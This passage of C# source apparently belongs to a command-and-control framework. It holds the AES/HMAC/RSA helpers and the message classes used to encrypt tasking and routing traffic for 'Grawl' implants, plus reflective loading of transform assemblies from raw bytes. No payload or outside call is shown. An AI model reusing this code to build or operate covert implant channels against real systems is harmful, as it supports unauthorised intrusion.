                    SessKEy.GenerateIV();
                    SessKEy.Key = key;

                    byte[] encrypted = SessKEy.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);

                    return SessKEy.IV.Concat(encrypted).ToArray();
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public static byte[] AesDecrypt(byte[] data, byte[] key)
            {
                using (Aes SessKEy = Aes.Create())
                {
                    SessKEy.IV = data.Take(Common.AesIVLength).ToArray();
                    SessKEy.Key = key;

                    byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
                    return SessKEy.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }

            // Convenience method for decrypting an EncMsgPacket
            public static byte[] AesDecrypt(ModelUtilities.GrawlEncMsg encryptedMessage, byte[] key)
            {
                return AesDecrypt(
                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncMsg)).ToArray(),
                    key
                );
            }

            public static byte[] ComputeHMAC(byte[] data, byte[] key)
            {
                using (HMACSHA256 SessionHmac = new HMACSHA256(key))
                {
                    return SessionHmac.ComputeHash(data);
                }
            }

            public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
            {
                using (HMACSHA256 hmac = new HMACSHA256(key))
                {
                    byte[] calculatedHash = hmac.ComputeHash(hashedBytes);

                    // Should do double hmac?
                    return Enumerable.SequenceEqual(calculatedHash, hash);
                }
            }

            public static byte[] RSAEncrypt(byte[] toEncrypt, string RSAPublicKeyXMLString)
            {
                using (RSA RSAPublicKey = RSA.Create())
                {
                    RSAKeyExtensions.FromXmlString(RSAPublicKey, RSAPublicKeyXMLString);
                    return RSAPublicKey.Encrypt(toEncrypt, RSAEncryptionPadding.OaepSHA1);
                }
            }

            public static byte[] GrawlRSAEncrypt(APIModels.Grawl grawl, byte[] toEncrypt)
            {
                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.RedWolfEncoding.GetString(Convert.FromBase64String(grawl.GrawlRSAPublicKey)));
            }
        }

        internal class ModelUtilities
        {
            public string ProfileTransform(ProfileTransformAssembly ProfileTransformAssembly, byte[] bytes)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("MessageTransform");
                return (string)t.GetMethod("Transform").Invoke(null, new object[] { bytes });
            }

            public byte[] ProfileInvert(ProfileTransformAssembly ProfileTransformAssembly, string str)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("MessageTransform");
                return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
            }

            public partial class GrawlTaskingMessage
            {
                public GrawlTaskingMessage()
                {
                    CustomInit();
                }
                public GrawlTaskingMessage(APIModels.GrawlTaskingType? type = default(APIModels.GrawlTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
                {
                    Type = type;
                    Name = name;
                    Message = message;
                    Token = token;
                    CustomInit();
                }
                partial void CustomInit();
                [JsonProperty(PropertyName = "type")]
                public APIModels.GrawlTaskingType? Type { get; set; }
                [JsonProperty(PropertyName = "name")]
                public string Name { get; set; }
                [JsonProperty(PropertyName = "message")]
                public string Message { get; set; }
                [JsonProperty(PropertyName = "token")]
                public bool? Token { get; set; }
            }

            public partial class GrawlTaskingMessageResponse
            {
                public GrawlTaskingMessageResponse()
                {
                    CustomInit();
                }
                public GrawlTaskingMessageResponse(APIModels.GrawlTaskingStatus? status = default(APIModels.GrawlTaskingStatus?), string output = default(string))
                {
                    Status = status;
                    Output = output;
                    CustomInit();
                }
                partial void CustomInit();
                [JsonProperty(PropertyName = "status")]
                public APIModels.GrawlTaskingStatus? Status { get; set; }
                [JsonProperty(PropertyName = "output")]
                public string Output { get; set; }
            }

            public enum GrawlEncMsgType
            {
                Routing,
                Tasking
            }

            public class GrawlEncMsg
            {
                public string ANOTHERID { get; set; }
                public GrawlEncMsgType Type { get; set; }
                public string Meta { get; set; } = "";

                public string IV { get; set; }
                public string EncMsg { get; set; }
                public string HMAC { get; set; }

                private static GrawlEncMsg Create(string ANOTHERID, byte[] message, byte[] key, GrawlEncMsgType Type = GrawlEncMsgType.Tasking)
                {
                    byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                    byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                    byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                    byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
                    return new GrawlEncMsg
                    {
                        ANOTHERID = ANOTHERID,
                        Type = Type,
                        EncMsg = Convert.ToBase64String(encryptedMessage),
                        IV = Convert.ToBase64String(encryptionIV),
                        HMAC = Convert.ToBase64String(hmac)
                    };
                }

                public static GrawlEncMsg Create(APIModels.Grawl grawl, byte[] message, GrawlEncMsgType Type = GrawlEncMsgType.Tasking)
                {
                    if (grawl.Status == APIModels.GrawlStatus.Uninitialized || grawl.Status == APIModels.GrawlStatus.Stage0)
                    {
                        return Create(grawl.Guid, message, Convert.FromBase64String(grawl.GrawlSharedSecretPassword), Type);
                    }
                    return Create(grawl.Guid, message, Convert.FromBase64String(grawl.GrawlNegotiatedSessKEy), Type);
                }

                public bool VerifyHMAC(byte[] Key)
                {
                    if (IV == "" || EncMsg == "" || HMAC == "" || Key.Length == 0) { return false; }
                    try
                    {
                        var hashedBytes = Convert.FromBase64String(this.EncMsg);
                        return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public byte[] GrawlSessionDecrypt(APIModels.Grawl grawl, byte[] data)
            {
                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grawl.GrawlNegotiatedSessKEy));
            }

            // Convenience method for decrypting a GrawlEncMsg
            public byte[] GrawlSessionDecrypt(APIModels.Grawl grawl, GrawlEncMsg grawlEncMsg)
            {
                return this.GrawlSessionDecrypt(grawl, Convert.FromBase64String(grawlEncMsg.IV)
                    .Concat(Convert.FromBase64String(grawlEncMsg.EncMsg)).ToArray());
            }
        }
    }

    internal static class RSAKeyExtensions
    {
        public static void FromXmlString(this RSA rsa, string xmlString)
        {
            RSAParameters parameters = new RSAParameters();

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xmlString);

            if (xmlDoc.DocumentElement.Name.Equals("RSAKeyValue"))
            {
                foreach (XmlNode node in xmlDoc.DocumentElement.ChildNodes)
                {
                    switch (node.Name)
                    {
                        case "Modulus": parameters.Modulus = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Exponent": parameters.Exponent = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "P": parameters.P = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Q": parameters.Q = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DP": parameters.DP = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DQ": parameters.DQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "InverseQ": parameters.InverseQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "D": parameters.D = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                    }
                }
            }
            else
            {
                throw new Exception("Invalid XML RSA key.");
            }

            rsa.ImportParameters(parameters);
        }

        public static string ToXmlString(this RSA rsa, bool includePrivateParameters)
        {
            RSAParameters parameters = rsa.ExportParameters(includePrivateParameters);

            return string.Format("<RSAKeyValue><Modulus>{0}</Modulus><Exponent>{1}</Exponent><P>{2}</P><Q>{3}</Q><DP>{4}</DP><DQ>{5}</DQ><InverseQ>{6}</InverseQ><D>{7}</D></RSAKeyValue>",
                  parameters.Modulus != null ? Convert.ToBase64String(parameters.Modulus) : null,
                  parameters.Exponent != null ? Convert.ToBase64String(parameters.Exponent) : null,
                  parameters.P != null ? Convert.ToBase64String(parameters.P) : null,
                  parameters.Q != null ? Convert.ToBase64String(parameters.Q) : null,
                  parameters.DP != null ? Convert.ToBase64String(parameters.DP) : null,
                  parameters.DQ != null ? Convert.ToBase64String(parameters.DQ) : null,
                  parameters.InverseQ != null ? Convert.ToBase64String(parameters.InverseQ) : null,
                  parameters.D != null ? Convert.ToBase64String(parameters.D) : null);
        }
    }
}
